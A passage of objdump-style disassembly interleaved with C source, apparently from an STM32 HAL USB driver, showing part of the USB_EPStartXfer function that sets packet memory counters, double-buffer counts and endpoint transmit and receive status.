 80074f2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074f6:	f003 0301 	and.w	r3, r3, #1
 80074fa:	2b00      	cmp	r3, #0
 80074fc:	d004      	beq.n	8007508 <USB_EPStartXfer+0xafe>
 80074fe:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007502:	3301      	adds	r3, #1
 8007504:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007508:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800750a:	881b      	ldrh	r3, [r3, #0]
 800750c:	b29a      	uxth	r2, r3
 800750e:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007512:	b29b      	uxth	r3, r3
 8007514:	029b      	lsls	r3, r3, #10
 8007516:	b29b      	uxth	r3, r3
 8007518:	4313      	orrs	r3, r2
 800751a:	b29a      	uxth	r2, r3
 800751c:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800751e:	801a      	strh	r2, [r3, #0]
 8007520:	e024      	b.n	800756c <USB_EPStartXfer+0xb62>
 8007522:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007526:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800752a:	681b      	ldr	r3, [r3, #0]
 800752c:	785b      	ldrb	r3, [r3, #1]
 800752e:	2b01      	cmp	r3, #1
 8007530:	d11c      	bne.n	800756c <USB_EPStartXfer+0xb62>
 8007532:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007536:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800753a:	681b      	ldr	r3, [r3, #0]
 800753c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007540:	b29b      	uxth	r3, r3
 8007542:	461a      	mov	r2, r3
 8007544:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 8007546:	4413      	add	r3, r2
 8007548:	673b      	str	r3, [r7, #112]	; 0x70
 800754a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800754e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007552:	681b      	ldr	r3, [r3, #0]
 8007554:	781b      	ldrb	r3, [r3, #0]
 8007556:	00da      	lsls	r2, r3, #3
 8007558:	6f3b      	ldr	r3, [r7, #112]	; 0x70
 800755a:	4413      	add	r3, r2
 800755c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007560:	66fb      	str	r3, [r7, #108]	; 0x6c
 8007562:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007566:	b29a      	uxth	r2, r3
 8007568:	6efb      	ldr	r3, [r7, #108]	; 0x6c
 800756a:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr1;
 800756c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007570:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007574:	681b      	ldr	r3, [r3, #0]
 8007576:	895b      	ldrh	r3, [r3, #10]
 8007578:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 800757c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007580:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007584:	681b      	ldr	r3, [r3, #0]
 8007586:	6959      	ldr	r1, [r3, #20]
 8007588:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800758c:	b29b      	uxth	r3, r3
 800758e:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007592:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007596:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 800759a:	6800      	ldr	r0, [r0, #0]
 800759c:	f000 ff41 	bl	8008422 <USB_WritePMA>
 80075a0:	e0ca      	b.n	8007738 <USB_EPStartXfer+0xd2e>
        }
        else
        {
          /* Set the Double buffer counter for pmabuffer0 */
          PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 80075a2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075a6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075aa:	681b      	ldr	r3, [r3, #0]
 80075ac:	785b      	ldrb	r3, [r3, #1]
 80075ae:	2b00      	cmp	r3, #0
 80075b0:	d177      	bne.n	80076a2 <USB_EPStartXfer+0xc98>
 80075b2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075b6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80075ba:	681b      	ldr	r3, [r3, #0]
 80075bc:	67fb      	str	r3, [r7, #124]	; 0x7c
 80075be:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075c2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80075c6:	681b      	ldr	r3, [r3, #0]
 80075c8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80075cc:	b29b      	uxth	r3, r3
 80075ce:	461a      	mov	r2, r3
 80075d0:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 80075d2:	4413      	add	r3, r2
 80075d4:	67fb      	str	r3, [r7, #124]	; 0x7c
 80075d6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80075da:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80075de:	681b      	ldr	r3, [r3, #0]
 80075e0:	781b      	ldrb	r3, [r3, #0]
 80075e2:	00da      	lsls	r2, r3, #3
 80075e4:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 80075e6:	4413      	add	r3, r2
 80075e8:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80075ec:	67bb      	str	r3, [r7, #120]	; 0x78
 80075ee:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80075f0:	881b      	ldrh	r3, [r3, #0]
 80075f2:	b29b      	uxth	r3, r3
 80075f4:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80075f8:	b29a      	uxth	r2, r3
 80075fa:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80075fc:	801a      	strh	r2, [r3, #0]
 80075fe:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007602:	2b3e      	cmp	r3, #62	; 0x3e
 8007604:	d921      	bls.n	800764a <USB_EPStartXfer+0xc40>
 8007606:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800760a:	095b      	lsrs	r3, r3, #5
 800760c:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007610:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007614:	f003 031f 	and.w	r3, r3, #31
 8007618:	2b00      	cmp	r3, #0
 800761a:	d104      	bne.n	8007626 <USB_EPStartXfer+0xc1c>
 800761c:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007620:	3b01      	subs	r3, #1
 8007622:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007626:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007628:	881b      	ldrh	r3, [r3, #0]
 800762a:	b29a      	uxth	r2, r3
 800762c:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007630:	b29b      	uxth	r3, r3
 8007632:	029b      	lsls	r3, r3, #10
 8007634:	b29b      	uxth	r3, r3
 8007636:	4313      	orrs	r3, r2
 8007638:	b29b      	uxth	r3, r3
 800763a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800763e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007642:	b29a      	uxth	r2, r3
 8007644:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007646:	801a      	strh	r2, [r3, #0]
 8007648:	e05c      	b.n	8007704 <USB_EPStartXfer+0xcfa>
 800764a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800764e:	2b00      	cmp	r3, #0
 8007650:	d10a      	bne.n	8007668 <USB_EPStartXfer+0xc5e>
 8007652:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007654:	881b      	ldrh	r3, [r3, #0]
 8007656:	b29b      	uxth	r3, r3
 8007658:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800765c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007660:	b29a      	uxth	r2, r3
 8007662:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007664:	801a      	strh	r2, [r3, #0]
 8007666:	e04d      	b.n	8007704 <USB_EPStartXfer+0xcfa>
 8007668:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800766c:	085b      	lsrs	r3, r3, #1
 800766e:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007672:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007676:	f003 0301 	and.w	r3, r3, #1
 800767a:	2b00      	cmp	r3, #0
 800767c:	d004      	beq.n	8007688 <USB_EPStartXfer+0xc7e>
 800767e:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007682:	3301      	adds	r3, #1
 8007684:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007688:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800768a:	881b      	ldrh	r3, [r3, #0]
 800768c:	b29a      	uxth	r2, r3
 800768e:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007692:	b29b      	uxth	r3, r3
 8007694:	029b      	lsls	r3, r3, #10
 8007696:	b29b      	uxth	r3, r3
 8007698:	4313      	orrs	r3, r2
 800769a:	b29a      	uxth	r2, r3
 800769c:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800769e:	801a      	strh	r2, [r3, #0]
 80076a0:	e030      	b.n	8007704 <USB_EPStartXfer+0xcfa>
 80076a2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076a6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80076aa:	681b      	ldr	r3, [r3, #0]
 80076ac:	785b      	ldrb	r3, [r3, #1]
 80076ae:	2b01      	cmp	r3, #1
 80076b0:	d128      	bne.n	8007704 <USB_EPStartXfer+0xcfa>
 80076b2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076b6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80076ba:	681b      	ldr	r3, [r3, #0]
 80076bc:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 80076c0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076c4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80076c8:	681b      	ldr	r3, [r3, #0]
 80076ca:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80076ce:	b29b      	uxth	r3, r3
 80076d0:	461a      	mov	r2, r3
 80076d2:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 80076d6:	4413      	add	r3, r2
 80076d8:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 80076dc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076e0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80076e4:	681b      	ldr	r3, [r3, #0]
 80076e6:	781b      	ldrb	r3, [r3, #0]
 80076e8:	00da      	lsls	r2, r3, #3
 80076ea:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 80076ee:	4413      	add	r3, r2
 80076f0:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80076f4:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 80076f8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80076fc:	b29a      	uxth	r2, r3
 80076fe:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 8007702:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 8007704:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007708:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800770c:	681b      	ldr	r3, [r3, #0]
 800770e:	891b      	ldrh	r3, [r3, #8]
 8007710:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007714:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007718:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800771c:	681b      	ldr	r3, [r3, #0]
 800771e:	6959      	ldr	r1, [r3, #20]
 8007720:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007724:	b29b      	uxth	r3, r3
 8007726:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 800772a:	f507 7084 	add.w	r0, r7, #264	; 0x108
 800772e:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007732:	6800      	ldr	r0, [r0, #0]
 8007734:	f000 fe75 	bl	8008422 <USB_WritePMA>
        }
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_VALID);
 8007738:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800773c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007740:	681a      	ldr	r2, [r3, #0]
 8007742:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007746:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800774a:	681b      	ldr	r3, [r3, #0]
 800774c:	781b      	ldrb	r3, [r3, #0]
 800774e:	009b      	lsls	r3, r3, #2
 8007750:	4413      	add	r3, r2
 8007752:	881b      	ldrh	r3, [r3, #0]
 8007754:	b29b      	uxth	r3, r3
 8007756:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800775a:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800775e:	817b      	strh	r3, [r7, #10]
 8007760:	897b      	ldrh	r3, [r7, #10]
 8007762:	f083 0310 	eor.w	r3, r3, #16
 8007766:	817b      	strh	r3, [r7, #10]
 8007768:	897b      	ldrh	r3, [r7, #10]
 800776a:	f083 0320 	eor.w	r3, r3, #32
 800776e:	817b      	strh	r3, [r7, #10]
 8007770:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007774:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007778:	681a      	ldr	r2, [r3, #0]
 800777a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800777e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007782:	681b      	ldr	r3, [r3, #0]
 8007784:	781b      	ldrb	r3, [r3, #0]
 8007786:	009b      	lsls	r3, r3, #2
 8007788:	441a      	add	r2, r3
 800778a:	897b      	ldrh	r3, [r7, #10]
 800778c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007790:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007794:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007798:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800779c:	b29b      	uxth	r3, r3
 800779e:	8013      	strh	r3, [r2, #0]
 80077a0:	f000 bcde 	b.w	8008160 <USB_EPStartXfer+0x1756>
  }
  else /* OUT endpoint */
  {
    if (ep->doublebuffer == 0U)
 80077a4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077a8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077ac:	681b      	ldr	r3, [r3, #0]
 80077ae:	7b1b      	ldrb	r3, [r3, #12]
 80077b0:	2b00      	cmp	r3, #0
 80077b2:	f040 80bb 	bne.w	800792c <USB_EPStartXfer+0xf22>
    {
      /* Multi packet transfer */
      if (ep->xfer_len > ep->maxpacket)
 80077b6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077ba:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077be:	681b      	ldr	r3, [r3, #0]
 80077c0:	699a      	ldr	r2, [r3, #24]
 80077c2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077c6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077ca:	681b      	ldr	r3, [r3, #0]
 80077cc:	691b      	ldr	r3, [r3, #16]
 80077ce:	429a      	cmp	r2, r3
 80077d0:	d917      	bls.n	8007802 <USB_EPStartXfer+0xdf8>
      {
        len = ep->maxpacket;
 80077d2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077d6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077da:	681b      	ldr	r3, [r3, #0]
 80077dc:	691b      	ldr	r3, [r3, #16]
 80077de:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len -= len;
 80077e2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077e6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077ea:	681b      	ldr	r3, [r3, #0]
 80077ec:	699a      	ldr	r2, [r3, #24]
 80077ee:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80077f2:	1ad2      	subs	r2, r2, r3
 80077f4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077f8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077fc:	681b      	ldr	r3, [r3, #0]
 80077fe:	619a      	str	r2, [r3, #24]
 8007800:	e00e      	b.n	8007820 <USB_EPStartXfer+0xe16>
      }
      else
      {
        len = ep->xfer_len;
 8007802:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007806:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800780a:	681b      	ldr	r3, [r3, #0]
 800780c:	699b      	ldr	r3, [r3, #24]
 800780e:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len = 0U;
 8007812:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007816:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800781a:	681b      	ldr	r3, [r3, #0]
 800781c:	2200      	movs	r2, #0
 800781e:	619a      	str	r2, [r3, #24]
      }
      /* configure and validate Rx endpoint */
      PCD_SET_EP_RX_CNT(USBx, ep->num, len);
 8007820:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007824:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007828:	681b      	ldr	r3, [r3, #0]
 800782a:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 800782e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007832:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007836:	681b      	ldr	r3, [r3, #0]
 8007838:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800783c:	b29b      	uxth	r3, r3
 800783e:	461a      	mov	r2, r3
 8007840:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 8007844:	4413      	add	r3, r2
 8007846:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 800784a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800784e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007852:	681b      	ldr	r3, [r3, #0]
 8007854:	781b      	ldrb	r3, [r3, #0]
 8007856:	00da      	lsls	r2, r3, #3
 8007858:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 800785c:	4413      	add	r3, r2
 800785e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007862:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
 8007866:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800786a:	881b      	ldrh	r3, [r3, #0]
 800786c:	b29b      	uxth	r3, r3
 800786e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007872:	b29a      	uxth	r2, r3
 8007874:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007878:	801a      	strh	r2, [r3, #0]
 800787a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800787e:	2b3e      	cmp	r3, #62	; 0x3e
 8007880:	d924      	bls.n	80078cc <USB_EPStartXfer+0xec2>
 8007882:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007886:	095b      	lsrs	r3, r3, #5
 8007888:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 800788c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007890:	f003 031f 	and.w	r3, r3, #31
 8007894:	2b00      	cmp	r3, #0
 8007896:	d104      	bne.n	80078a2 <USB_EPStartXfer+0xe98>
 8007898:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 800789c:	3b01      	subs	r3, #1
 800789e:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 80078a2:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80078a6:	881b      	ldrh	r3, [r3, #0]
 80078a8:	b29a      	uxth	r2, r3
 80078aa:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 80078ae:	b29b      	uxth	r3, r3
 80078b0:	029b      	lsls	r3, r3, #10
 80078b2:	b29b      	uxth	r3, r3
 80078b4:	4313      	orrs	r3, r2
 80078b6:	b29b      	uxth	r3, r3
 80078b8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80078bc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80078c0:	b29a      	uxth	r2, r3
 80078c2:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80078c6:	801a      	strh	r2, [r3, #0]
 80078c8:	f000 bc10 	b.w	80080ec <USB_EPStartXfer+0x16e2>
 80078cc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078d0:	2b00      	cmp	r3, #0
 80078d2:	d10c      	bne.n	80078ee <USB_EPStartXfer+0xee4>
 80078d4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80078d8:	881b      	ldrh	r3, [r3, #0]
 80078da:	b29b      	uxth	r3, r3
 80078dc:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80078e0:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80078e4:	b29a      	uxth	r2, r3
 80078e6:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80078ea:	801a      	strh	r2, [r3, #0]
 80078ec:	e3fe      	b.n	80080ec <USB_EPStartXfer+0x16e2>
 80078ee:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078f2:	085b      	lsrs	r3, r3, #1
 80078f4:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 80078f8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80078fc:	f003 0301 	and.w	r3, r3, #1
 8007900:	2b00      	cmp	r3, #0
 8007902:	d004      	beq.n	800790e <USB_EPStartXfer+0xf04>
 8007904:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007908:	3301      	adds	r3, #1
 800790a:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 800790e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007912:	881b      	ldrh	r3, [r3, #0]
 8007914:	b29a      	uxth	r2, r3
 8007916:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 800791a:	b29b      	uxth	r3, r3
 800791c:	029b      	lsls	r3, r3, #10
 800791e:	b29b      	uxth	r3, r3
 8007920:	4313      	orrs	r3, r2
 8007922:	b29a      	uxth	r2, r3
 8007924:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007928:	801a      	strh	r2, [r3, #0]
 800792a:	e3df      	b.n	80080ec <USB_EPStartXfer+0x16e2>
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* First Transfer Coming From HAL_PCD_EP_Receive & From ISR */
      /* Set the Double buffer counter */
      if (ep->type == EP_TYPE_BULK)
 800792c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007930:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007934:	681b      	ldr	r3, [r3, #0]
 8007936:	78db      	ldrb	r3, [r3, #3]
 8007938:	2b02      	cmp	r3, #2
 800793a:	f040 8218 	bne.w	8007d6e <USB_EPStartXfer+0x1364>
      {
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, ep->maxpacket);
 800793e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007942:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007946:	681b      	ldr	r3, [r3, #0]
 8007948:	785b      	ldrb	r3, [r3, #1]
 800794a:	2b00      	cmp	r3, #0
 800794c:	f040 809d 	bne.w	8007a8a <USB_EPStartXfer+0x1080>
 8007950:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007954:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007958:	681b      	ldr	r3, [r3, #0]
 800795a:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 800795e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007962:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007966:	681b      	ldr	r3, [r3, #0]
 8007968:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800796c:	b29b      	uxth	r3, r3
 800796e:	461a      	mov	r2, r3
 8007970:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 8007974:	4413      	add	r3, r2
 8007976:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 800797a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800797e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007982:	681b      	ldr	r3, [r3, #0]
 8007984:	781b      	ldrb	r3, [r3, #0]
 8007986:	00da      	lsls	r2, r3, #3
 8007988:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 800798c:	4413      	add	r3, r2
 800798e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007992:	f8c7 30a8 	str.w	r3, [r7, #168]	; 0xa8
 8007996:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 800799a:	881b      	ldrh	r3, [r3, #0]
 800799c:	b29b      	uxth	r3, r3
 800799e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80079a2:	b29a      	uxth	r2, r3
 80079a4:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 80079a8:	801a      	strh	r2, [r3, #0]
 80079aa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079ae:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079b2:	681b      	ldr	r3, [r3, #0]
 80079b4:	691b      	ldr	r3, [r3, #16]
 80079b6:	2b3e      	cmp	r3, #62	; 0x3e
 80079b8:	d92b      	bls.n	8007a12 <USB_EPStartXfer+0x1008>
 80079ba:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079be:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079c2:	681b      	ldr	r3, [r3, #0]
 80079c4:	691b      	ldr	r3, [r3, #16]
 80079c6:	095b      	lsrs	r3, r3, #5
 80079c8:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 80079cc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079d0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079d4:	681b      	ldr	r3, [r3, #0]
 80079d6:	691b      	ldr	r3, [r3, #16]
 80079d8:	f003 031f 	and.w	r3, r3, #31
 80079dc:	2b00      	cmp	r3, #0
 80079de:	d104      	bne.n	80079ea <USB_EPStartXfer+0xfe0>
 80079e0:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 80079e4:	3b01      	subs	r3, #1
 80079e6:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 80079ea:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 80079ee:	881b      	ldrh	r3, [r3, #0]
 80079f0:	b29a      	uxth	r2, r3
 80079f2:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 80079f6:	b29b      	uxth	r3, r3
 80079f8:	029b      	lsls	r3, r3, #10
 80079fa:	b29b      	uxth	r3, r3
 80079fc:	4313      	orrs	r3, r2
 80079fe:	b29b      	uxth	r3, r3
 8007a00:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007a04:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007a08:	b29a      	uxth	r2, r3
 8007a0a:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a0e:	801a      	strh	r2, [r3, #0]
 8007a10:	e070      	b.n	8007af4 <USB_EPStartXfer+0x10ea>
 8007a12:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a16:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a1a:	681b      	ldr	r3, [r3, #0]
 8007a1c:	691b      	ldr	r3, [r3, #16]
 8007a1e:	2b00      	cmp	r3, #0
 8007a20:	d10c      	bne.n	8007a3c <USB_EPStartXfer+0x1032>
 8007a22:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a26:	881b      	ldrh	r3, [r3, #0]
 8007a28:	b29b      	uxth	r3, r3
 8007a2a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007a2e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007a32:	b29a      	uxth	r2, r3
 8007a34:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a38:	801a      	strh	r2, [r3, #0]
 8007a3a:	e05b      	b.n	8007af4 <USB_EPStartXfer+0x10ea>
 8007a3c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a40:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a44:	681b      	ldr	r3, [r3, #0]
 8007a46:	691b      	ldr	r3, [r3, #16]
 8007a48:	085b      	lsrs	r3, r3, #1
 8007a4a:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 8007a4e:	f507 7384 	add.w	r3, r7, #264	; 0x108
